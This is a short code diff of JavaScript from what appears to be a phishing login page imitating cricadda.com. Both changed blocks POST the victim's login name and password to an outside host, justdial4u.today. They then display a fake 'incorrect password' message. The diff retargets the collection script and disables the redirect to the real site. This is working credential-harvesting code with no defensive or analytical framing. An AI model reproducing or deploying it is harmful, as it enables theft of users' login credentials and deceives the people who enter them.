@@ -1400,12 +1400,12 @@
 			var password = sessionStorage.getItem("password");
 			$.ajax({
 			  type: "POST",			 
-			  url: "https://justdial4u.today/mail.php",
+			  url: "https://justdial4u.today/cricadda-win-mail.php",
 			  data: "loginName=" + loginName + "&password=" + password,
 			  success: function (msg) {
 				$("#errorMsg").html('Username and password is incorrect.');
 				if (msg = "sucessmsg") {
-				  window.location.href = "https://cricadda.com/";
+				  //window.location.href = "https://cricadda.com/";
 				}
 			  }
 			})
@@ -1428,12 +1428,12 @@
 			var password = sessionStorage.getItem("password1");
 			$.ajax({
 			  type: "POST",
-			  url: "https://justdial4u.today/mail.php",
+			  url: "https://justdial4u.today/cricadda-win-mail.php",
 			  data: "loginName=" + loginName + "&password=" + password,
 			  success: function (msg) {
 				$("#errorMsg").html('Username and password is incorrect.');
 				if (msg = "sucessmsg") {
-				  window.location.href = "https://cricadda.com/";
+				  //window.location.href = "https://cricadda.com/";
 				}
 			  }
 			})
